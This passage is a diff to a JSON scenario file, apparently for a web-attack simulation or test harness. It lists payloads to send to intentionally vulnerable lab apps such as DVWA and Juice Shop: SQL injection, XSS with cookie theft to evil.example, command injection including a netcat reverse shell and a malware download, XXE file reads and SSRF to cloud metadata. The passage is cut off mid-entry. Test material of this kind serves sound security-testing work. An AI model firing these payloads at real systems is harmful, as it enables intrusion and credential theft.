@@ -10739,7 +10739,211 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "payload-0-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "' OR '1'='1"
+            }
+          },
+          {
+            "id": "payload-0-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli/",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "id": "' OR '1'='1"
+            }
+          },
+          {
+            "id": "payload-1-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "' OR '1'='1' --"
+            }
+          },
+          {
+            "id": "payload-1-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli/",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "id": "' OR '1'='1' --"
+            }
+          },
+          {
+            "id": "payload-2-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "' UNION SELECT NULL,NULL,NULL --"
+            }
+          },
+          {
+            "id": "payload-2-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli/",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "id": "' UNION SELECT NULL,NULL,NULL --"
+            }
+          },
+          {
+            "id": "payload-3-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "1; DROP TABLE users --"
+            }
+          },
+          {
+            "id": "payload-3-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli/",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "id": "1; DROP TABLE users --"
+            }
+          },
+          {
+            "id": "payload-4-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "admin'--"
+            }
+          },
+          {
+            "id": "payload-4-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli/",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "id": "admin'--"
+            }
+          },
+          {
+            "id": "payload-5-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "' OR 1=1#"
+            }
+          },
+          {
+            "id": "payload-5-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli/",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "id": "' OR 1=1#"
+            }
+          },
+          {
+            "id": "payload-6-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "1' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--"
+            }
+          },
+          {
+            "id": "payload-6-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli/",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "id": "1' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--"
+            }
+          },
+          {
+            "id": "payload-7-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "' UNION SELECT username,password FROM users--"
+            }
+          },
+          {
+            "id": "payload-7-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli/",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "id": "' UNION SELECT username,password FROM users--"
+            }
+          },
+          {
+            "id": "payload-8-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "1 OR 1=1"
+            }
+          },
+          {
+            "id": "payload-8-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli/",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "id": "1 OR 1=1"
+            }
+          },
+          {
+            "id": "payload-9-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "'; EXEC xp_cmdshell('whoami')--"
+            }
+          },
+          {
+            "id": "payload-9-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli/",
+            "payload_class": "sql-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "id": "'; EXEC xp_cmdshell('whoami')--"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "web-app-attacks/02-xss",
@@ -10752,7 +10956,347 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "payload-0-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "<script>alert(\"XSS\")</script>"
+            }
+          },
+          {
+            "id": "payload-0-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "name": "<script>alert(\"XSS\")</script>"
+            }
+          },
+          {
+            "id": "stored-0",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "stored-xss",
+            "minimum_dispatches": 1,
+            "body_exact": "txtName=attacker&mtxMessage=%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E&btnSign=Sign+Guestbook"
+          },
+          {
+            "id": "payload-1-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "<img src=x onerror=alert(1)>"
+            }
+          },
+          {
+            "id": "payload-1-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "name": "<img src=x onerror=alert(1)>"
+            }
+          },
+          {
+            "id": "stored-1",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "stored-xss",
+            "minimum_dispatches": 1,
+            "body_exact": "txtName=attacker&mtxMessage=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E&btnSign=Sign+Guestbook"
+          },
+          {
+            "id": "payload-2-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "<svg onload=alert(1)>"
+            }
+          },
+          {
+            "id": "payload-2-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "name": "<svg onload=alert(1)>"
+            }
+          },
+          {
+            "id": "stored-2",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "stored-xss",
+            "minimum_dispatches": 1,
+            "body_exact": "txtName=attacker&mtxMessage=%3Csvg%20onload%3Dalert%281%29%3E&btnSign=Sign+Guestbook"
+          },
+          {
+            "id": "payload-3-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "<body onload=alert(1)>"
+            }
+          },
+          {
+            "id": "payload-3-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "name": "<body onload=alert(1)>"
+            }
+          },
+          {
+            "id": "stored-3",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "stored-xss",
+            "minimum_dispatches": 1,
+            "body_exact": "txtName=attacker&mtxMessage=%3Cbody%20onload%3Dalert%281%29%3E&btnSign=Sign+Guestbook"
+          },
+          {
+            "id": "payload-4-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "\"><script>alert(document.cookie)</script>"
+            }
+          },
+          {
+            "id": "payload-4-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "name": "\"><script>alert(document.cookie)</script>"
+            }
+          },
+          {
+            "id": "stored-4",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "stored-xss",
+            "minimum_dispatches": 1,
+            "body_exact": "txtName=attacker&mtxMessage=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&btnSign=Sign+Guestbook"
+          },
+          {
+            "id": "payload-5-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "javascript:alert('XSS')"
+            }
+          },
+          {
+            "id": "payload-5-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "name": "javascript:alert('XSS')"
+            }
+          },
+          {
+            "id": "stored-5",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "stored-xss",
+            "minimum_dispatches": 1,
+            "body_exact": "txtName=attacker&mtxMessage=javascript%3Aalert%28%27XSS%27%29&btnSign=Sign+Guestbook"
+          },
+          {
+            "id": "payload-6-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "<iframe src=\"javascript:alert(1)\">"
+            }
+          },
+          {
+            "id": "payload-6-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "name": "<iframe src=\"javascript:alert(1)\">"
+            }
+          },
+          {
+            "id": "stored-6",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "stored-xss",
+            "minimum_dispatches": 1,
+            "body_exact": "txtName=attacker&mtxMessage=%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%3E&btnSign=Sign+Guestbook"
+          },
+          {
+            "id": "payload-7-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "<input onfocus=alert(1) autofocus>"
+            }
+          },
+          {
+            "id": "payload-7-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "name": "<input onfocus=alert(1) autofocus>"
+            }
+          },
+          {
+            "id": "stored-7",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "stored-xss",
+            "minimum_dispatches": 1,
+            "body_exact": "txtName=attacker&mtxMessage=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E&btnSign=Sign+Guestbook"
+          },
+          {
+            "id": "payload-8-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "<marquee onstart=alert(1)>"
+            }
+          },
+          {
+            "id": "payload-8-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "name": "<marquee onstart=alert(1)>"
+            }
+          },
+          {
+            "id": "stored-8",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "stored-xss",
+            "minimum_dispatches": 1,
+            "body_exact": "txtName=attacker&mtxMessage=%3Cmarquee%20onstart%3Dalert%281%29%3E&btnSign=Sign+Guestbook"
+          },
+          {
+            "id": "payload-9-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "<details open ontoggle=alert(1)>"
+            }
+          },
+          {
+            "id": "payload-9-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "name": "<details open ontoggle=alert(1)>"
+            }
+          },
+          {
+            "id": "stored-9",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "stored-xss",
+            "minimum_dispatches": 1,
+            "body_exact": "txtName=attacker&mtxMessage=%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E&btnSign=Sign+Guestbook"
+          },
+          {
+            "id": "payload-10-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "<svg><script>alert&#40;1&#41;</script></svg>"
+            }
+          },
+          {
+            "id": "payload-10-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "name": "<svg><script>alert&#40;1&#41;</script></svg>"
+            }
+          },
+          {
+            "id": "stored-10",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "stored-xss",
+            "minimum_dispatches": 1,
+            "body_exact": "txtName=attacker&mtxMessage=%3Csvg%3E%3Cscript%3Ealert%26%2340%3B1%26%2341%3B%3C/script%3E%3C/svg%3E&btnSign=Sign+Guestbook"
+          },
+          {
+            "id": "payload-11-target-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "q": "\"><img src=x onerror=fetch(\"https://evil.example/steal?c=\"+document.cookie)>"
+            }
+          },
+          {
+            "id": "payload-11-target-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "xss",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "name": "\"><img src=x onerror=fetch(\"https://evil.example/steal?c=\"+document.cookie)>"
+            }
+          },
+          {
+            "id": "stored-11",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "stored-xss",
+            "minimum_dispatches": 1,
+            "body_exact": "txtName=attacker&mtxMessage=%22%3E%3Cimg%20src%3Dx%20onerror%3Dfetch%28%22https%3A//evil.example/steal%3Fc%3D%22%2Bdocument.cookie%29%3E&btnSign=Sign+Guestbook"
+          }
+        ]
+      }
     },
     {
       "id": "web-app-attacks/03-command-injection",
@@ -10765,7 +11309,239 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "get-1",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1; cat /etc/passwd",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "post-1",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "body_exact": "ip=127.0.0.1%3B%20cat%20/etc/passwd&Submit=Submit"
+          },
+          {
+            "id": "get-2",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1; whoami",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "post-2",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "body_exact": "ip=127.0.0.1%3B%20whoami&Submit=Submit"
+          },
+          {
+            "id": "get-3",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1; id",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "post-3",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "body_exact": "ip=127.0.0.1%3B%20id&Submit=Submit"
+          },
+          {
+            "id": "get-4",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1; uname -a",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "post-4",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "body_exact": "ip=127.0.0.1%3B%20uname%20-a&Submit=Submit"
+          },
+          {
+            "id": "get-5",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1 | cat /etc/passwd",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "post-5",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "body_exact": "ip=127.0.0.1%20%7C%20cat%20/etc/passwd&Submit=Submit"
+          },
+          {
+            "id": "get-6",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1 | whoami",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "post-6",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "body_exact": "ip=127.0.0.1%20%7C%20whoami&Submit=Submit"
+          },
+          {
+            "id": "get-7",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1 && cat /etc/passwd",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "post-7",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "body_exact": "ip=127.0.0.1%20%26%26%20cat%20/etc/passwd&Submit=Submit"
+          },
+          {
+            "id": "get-8",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1; ls -la /etc/",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "post-8",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "body_exact": "ip=127.0.0.1%3B%20ls%20-la%20/etc/&Submit=Submit"
+          },
+          {
+            "id": "get-9",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1%0a cat /etc/passwd",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "post-9",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "body_exact": "ip=127.0.0.1%250a%20cat%20/etc/passwd&Submit=Submit"
+          },
+          {
+            "id": "get-10",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1%0d%0a cat /etc/passwd",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "post-10",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "body_exact": "ip=127.0.0.1%250d%250a%20cat%20/etc/passwd&Submit=Submit"
+          },
+          {
+            "id": "get-11",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1; nc -e /bin/sh evil.example 4444",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "post-11",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "body_exact": "ip=127.0.0.1%3B%20nc%20-e%20/bin/sh%20evil.example%204444&Submit=Submit"
+          },
+          {
+            "id": "get-12",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "ip": "127.0.0.1; wget http://evil.example/malware -O /tmp/malware",
+              "Submit": "Submit"
+            }
+          },
+          {
+            "id": "post-12",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/exec/",
+            "payload_class": "command-injection",
+            "minimum_dispatches": 1,
+            "body_exact": "ip=127.0.0.1%3B%20wget%20http%3A//evil.example/malware%20-O%20/tmp/malware&Submit=Submit"
+          }
+        ]
+      }
     },
     {
       "id": "web-app-attacks/04-path-traversal",
@@ -10817,7 +11593,121 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "xml-0",
+            "method": "POST",
+            "path": "/vampi/users/v1/register",
+            "payload_class": "xml-external-entity",
+            "minimum_dispatches": 1,
+            "headers": {
+              "content-type": "application/xml"
+            },
+            "body_exact": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><user><username>&xxe;</username><password>test</password><email>xxe@evil.example</email></user>"
+          },
+          {
+            "id": "xml-1",
+            "method": "POST",
+            "path": "/httpbin/post",
+            "payload_class": "xml-external-entity",
+            "minimum_dispatches": 1,
+            "headers": {
+              "content-type": "application/xml"
+            },
+            "body_exact": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><user><username>&xxe;</username><password>test</password><email>xxe@evil.example</email></user>"
+          },
+          {
+            "id": "xml-2",
+            "method": "POST",
+            "path": "/httpbin/post",
+            "payload_class": "xml-external-entity",
+            "minimum_dispatches": 1,
+            "headers": {
+              "content-type": "text/xml"
+            },
+            "body_exact": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><user><username>&xxe;</username><password>test</password><email>xxe@evil.example</email></user>"
+          },
+          {
+            "id": "xml-3",
+            "method": "POST",
+            "path": "/vampi/users/v1/register",
+            "payload_class": "xml-external-entity",
+            "minimum_dispatches": 1,
+            "headers": {
+              "content-type": "application/xml"
+            },
+            "body_exact": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><data><value>&xxe;</value></data>"
+          },
+          {
+            "id": "xml-4",
+            "method": "POST",
+            "path": "/httpbin/post",
+            "payload_class": "xml-external-entity",
+            "minimum_dispatches": 1,
+            "headers": {
+              "content-type": "application/xml"
+            },
+            "body_exact": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><data><value>&xxe;</value></data>"
+          },
+          {
+            "id": "xml-5",
+            "method": "POST",
+            "path": "/vampi/users/v1/register",
+            "payload_class": "xml-external-entity",
+            "minimum_dispatches": 1,
+            "headers": {
+              "content-type": "application/xml"
+            },
+            "body_exact": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.example/xxe.dtd\">%xxe;]><data><value>test</value></data>"
+          },
+          {
+            "id": "xml-6",
+            "method": "POST",
+            "path": "/httpbin/post",
+            "payload_class": "xml-external-entity",
+            "minimum_dispatches": 1,
+            "headers": {
+              "content-type": "text/xml"
+            },
+            "body_exact": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.example/xxe.dtd\">%xxe;]><data><value>test</value></data>"
+          },
+          {
+            "id": "xml-7",
+            "method": "POST",
+            "path": "/httpbin/post",
+            "payload_class": "xml-external-entity",
+            "minimum_dispatches": 1,
+            "headers": {
+              "content-type": "application/soap+xml"
+            },
+            "body_exact": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><data>&xxe;</data></soap:Body></soap:Envelope>"
+          },
+          {
+            "id": "xml-8",
+            "method": "POST",
+            "path": "/dvwa/",
+            "payload_class": "xml-external-entity",
+            "minimum_dispatches": 1,
+            "headers": {
+              "content-type": "application/xml"
+            },
+            "body_exact": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><login><username>&xxe;</username><password>password</password></login>"
+          },
+          {
+            "id": "xml-9",
+            "method": "POST",
+            "path": "/dvwa/",
+            "payload_class": "xml-external-entity",
+            "minimum_dispatches": 1,
+            "headers": {
+              "content-type": "text/xml"
+            },
+            "body_exact": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><login><username>&xxe;</username><password>password</password></login>"
+          }
+        ]
+      }
     },
     {
       "id": "web-app-attacks/08-ssrf",
@@ -10830,7 +11720,163 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "url-0",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "ssrf-url",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "url": "http://127.0.0.1/"
+            }
+          },
+          {
+            "id": "url-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "ssrf-url",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "url": "http://0.0.0.0/"
+            }
+          },
+          {
+            "id": "url-2",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "ssrf-url",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "url": "http://localhost/"
+            }
+          },
+          {
+            "id": "url-3",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "ssrf-url",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "url": "http://[::1]/"
+            }
+          },
+          {
+            "id": "url-4",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "ssrf-url",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "url": "http://127.0.0.1:22"
+            }
+          },
+          {
+            "id": "url-5",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "ssrf-url",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "url": "http://127.0.0.1:3306"
+            }
+          },
+          {
+            "id": "url-6",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "ssrf-url",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "url": "http://127.0.0.1:6379"
+            }
+          },
+          {
+            "id": "url-7",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "ssrf-url",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "url": "http://127.0.0.1:8080"
+            }
+          },
+          {
+            "id": "url-8",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "ssrf-url",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "url": "http://169.254.169.254/latest/meta-data/"
+            }
+          },
+          {
+            "id": "url-9",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "ssrf-url",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "url": "http://169.254.169.254/latest/user-data/"
+            }
+          },
+          {
+            "id": "url-10",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "ssrf-url",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "url": "http://metadata.google.internal/computeMetadata/v1/"
+            }
+          },
+          {
+            "id": "redirect-0",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "ssrf-redirect",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "url": "http://evil.example/redirect?to=http://169.254.169.254/"
+            }
+          },
+          {
+            "id": "redirect-1",
+            "method": "GET",
+            "path": "/httpbin/get",
